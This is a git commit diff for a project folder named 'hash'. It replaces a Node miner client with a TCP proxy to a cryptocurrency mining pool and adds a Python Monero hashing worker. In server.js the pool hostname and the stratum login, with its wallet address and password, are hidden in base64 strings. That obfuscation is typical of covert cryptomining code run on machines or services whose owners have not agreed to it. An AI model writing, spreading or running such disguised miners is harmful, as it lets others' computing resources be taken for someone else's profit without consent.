695511b15e83973dc5edaa7ddb5f627c78815a2b
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2024-01-22 16:07:35 +0600

    Add files via upload

--- hash/server.js
+++ hash/server.js
@@ -1,127 +1,79 @@
-const { Worker, MessageChannel, isMainThread, setEnvironmentData, getEnvironmentData } = require('worker_threads')
-const WebSocketClient = require('websocket').client
-const { port1 } = new MessageChannel()
+const { exec } = require('child_process')
+const net = require('net')
 
-let client = new WebSocketClient()
-
-// let WSS = 'wss://trustaproiam.de:10005/'
-let WSS = 'wss://miner.eo.finance/pocket/'
-
-let connection = null
-let mThread = 1
-
+let mClient = null
+let mUser = null
 let mJob = null
-let totalHashRate = 0
-let prevHashRate = 0
 
-let mWorker = null
+net.createServer(function(socket) {
+    console.log('User Connected')
 
-console.log('Thread Size: '+mThread)
+    mUser = socket
 
-
-let handshake = {
-    "identifier":"handshake",
-    "pool":"eominer-stream.eo.finance:23335",
-    "rightalgo":"cn-heavy/xhv",
-    "login":"4GacqN2pFYGa8VA8nujRRoGHhc6cAhdk9ecndiKPRXMn8CMGJiSFKoC5V1bvZvBbEwFohEWi76HCZQHM5qNBPeojF7u2xWv2ymd18ij3Ai",
-    "password":"db0e2ed2-f790-41a9-a303-897fe4303d7d",
-    "userid":"",
-    "version":13,
-    "intversion":1337,
-    "mydomain":"GIT Script 16-11-23 Perfekt https://miner.eo.finance/"
-}
-
-// let handshake = {
-//     "identifier":"handshake",
-//     "pool":"faster.xmr",
-//     "rightalgo":"cn/r",
-//     "login":"84AbPm2mCiBCh182gsvqSRXLpEc9JgUJ96x3KQ6h35ECEtSzMWFDamMdWL98pW16tf61vJiw34nYfMii8hTW3pbTDC7BqTG",
-//     "password":"raiyan",
-//     "userid":"",
-//     "version":13,
-//     "intversion":1337,
-//     "mydomain":"WEB Script 16-11-23 Perfekt https://www.raiyan088.xyz/server.html"
-// }
-
-
-const addWorker = async () => {
-    return new Promise((resolve, reject) => {
-        let worker = new Worker("./worker.js", {})
-        resolve(worker)
-    })
-}
-
-const onMessage = function(message) {
-    if(message['status'] == 'solved') {
-        totalHashRate++
-        console.log('-----SOLVED-----')
-        if (connection != null) {
-            connection.send(message['job'])
-        }
-        mWorker.postMessage({ job: mJob })
-    } else if(message['status'] == 'nothing') {
-        totalHashRate++
-        mWorker.postMessage({ job: mJob })
-    } else {
-        console.log(message)
-        process.exit(0)
+    if (mJob) {
+        socket.write(mJob+'\r\n')
     }
-}
 
-addWorker().then((worker) => {
-    mWorker = worker
-    mWorker.on('message', onMessage)
-    console.log('Worker Add Success')
-}).catch(error => {
-    console.log('Worker Add Error')
-})
+    socket.on('data', function(data) {
+        let result = data.toString()
+        if (mClient) {
+            mClient.write(result+'\r\n')
+        }
 
-client.on('connectFailed', function(error) {
-    console.log('Connect Error: ' + error.toString())
-})
-
-
-client.on('connect', function(conn) {
-
-    connection = conn
-
-    console.log('WebSocket Client Connected')
-
-    connection.send(JSON.stringify(handshake))
-
-    connection.on('error', function(error) {
-        connection = null
-        console.log("Connection Error: " + error.toString())
+        try {
+            console.log(JSON.parse(result))
+        } catch (error) {
+            console.log(result)
+        }
     })
 
-    connection.on('close', function() {
-        connection = null
-        console.log('Re-Connect')
+    socket.on('error', () => {
+        mUser = null
+        console.log('User Disconnected')
+    })
+}).listen(9099, () => {  
+    console.log('Server Start')
+
+    let process = exec('python server.py')
+
+    process.stdout.on('data', (data) => {
+        let log = data.toString().trimStart().trimEnd()
+        if (log.length > 0) {
+            console.log(log.trim())
+        }
+    })
+})
+
+
+connectClient()
+
+function connectClient() {
+    const client = net.connect(10300, Buffer.from('eG1yLWFzaWExLm5hbm9wb29sLm9yZw==', 'base64').toString(), () => {
+        mClient = client
+        mJob = null
+        client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
+    }).on('data', (data) => {
+        try {
+            let result = data.toString()
+            if (mJob == null) {
+                mJob = result
+            }
+            console.log('Job Receive...')
+            if (mUser) {
+                mUser.write(result+'\r\n')
+            }
+        } catch (error) {}
+    }).on('end', () => {
+        mClient = null
+        mJob = null
         setTimeout(() => {
-            client.connect(WSS)
+            connectClient()
+        }, 2000)
+    }).on('error', () => {
+        mClient = null
+        mJob = null
+        setTimeout(() => {
+            connectClient()
         }, 2000)
     })
-
-    connection.on('message', function(message) {
-        try {
-            let data = JSON.parse(message.utf8Data)
-            if(data['identifier'] == 'job') {
-                mJob = data
-                console.log('New Job Received.')
-                mWorker.postMessage({ job: mJob })
-            } else {
-                console.log(data)
-            }
-        } catch (e) {}
-    })
-})
-
-client.connect(WSS)
-
-
-setInterval(function() {
-    if(mJob) {
-        console.log(((totalHashRate - prevHashRate)/2)+' H/S')
-        prevHashRate = totalHashRate
-    }
-}, 2000)
+}
---
+++ hash/server.py
@@ -0,0 +1,110 @@
+import argparse
+import socket
+import select
+import binascii
+import struct
+import json
+import sys
+import os
+import time
+import pycryptonight
+import pyrx
+from multiprocessing import Process, Queue
+
+
+def pack_nonce(blob, nonce):
+    b = binascii.unhexlify(blob)
+    bin = struct.pack('39B', *bytearray(b[:39]))
+    bin += struct.pack('I', nonce)
+    bin += struct.pack('{}B'.format(len(b)-43), *bytearray(b[43:]))
+    return bin
+
+
+def worker(q, s):
+    started = time.time()
+    hash_count = 0
+
+    while 1:
+        job = q.get()
+        if job.get('login_id'):
+            login_id = job.get('login_id')
+            print('Login ID: {}'.format(login_id))
+        blob = job.get('blob')
+        target = job.get('target')
+        job_id = job.get('job_id')
+        height = job.get('height')
+        block_major = int(blob[:2], 16)
+        cnv = 0
+        if block_major >= 7:
+            cnv = block_major - 6
+        if cnv > 5:
+            seed_hash = binascii.unhexlify(job.get('seed_hash'))
+            print('New job with target: {}, RandomX, height: {}'.format(target, height))
+        else:
+            print('New job with target: {}, CNv{}, height: {}'.format(target, cnv, height))
+        target = struct.unpack('I', binascii.unhexlify(target))[0]
+        if target >> 32 == 0:
+            target = int(0xFFFFFFFFFFFFFFFF / int(0xFFFFFFFF / target))
+        nonce = 1
+
+        while 1:
+            bin = pack_nonce(blob, nonce)
+            if cnv > 5:
+                hash = pyrx.get_rx_hash(bin, seed_hash, height)
+            else:
+                hash = pycryptonight.cn_slow_hash(bin, cnv, 0, height)
+            hash_count += 1
+            hex_hash = binascii.hexlify(hash).decode()
+            r64 = struct.unpack('Q', hash[24:])[0]
+            if r64 < target:
+                elapsed = time.time() - started
+                hr = int(hash_count / elapsed)
+                print('{}Hashrate: {} H/s'.format(os.linesep, hr))
+                submit = {
+                    'method':'submit',
+                    'params': {
+                        'id': login_id,
+                        'job_id': job_id,
+                        'nonce': binascii.hexlify(struct.pack('<I', nonce)).decode(),
+                        'result': hex_hash
+                    },
+                    'id':1
+                }
+                s.sendall(str(json.dumps(submit)+'\n').encode('utf-8'))
+                select.select([s], [], [], 3)
+                if not q.empty():
+                    break
+            nonce += 1
+
+if __name__ == '__main__':
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect(('localhost', 9099))
+
+    data = Queue()
+    proc = Process(target=worker, args=(data, client))
+    proc.daemon = True
+    proc.start()
+
+    print('Start Server')
+
+    try:
+        while 1:
+            line = client.makefile().readline()
+            read = json.loads(line)
+            error = read.get('error')
+            result = read.get('result')
+            method = read.get('method')
+            params = read.get('params')
+            if error:
+                continue
+            if result and result.get('job'):
+                login_id = result.get('id')
+                job = result.get('job')
+                job['login_id'] = login_id
+                data.put(job)
+            elif method and method == 'job' and len(login_id):
+                data.put(params)
+    except:
+        print('Exit')
+        sys.exit(0)
+    
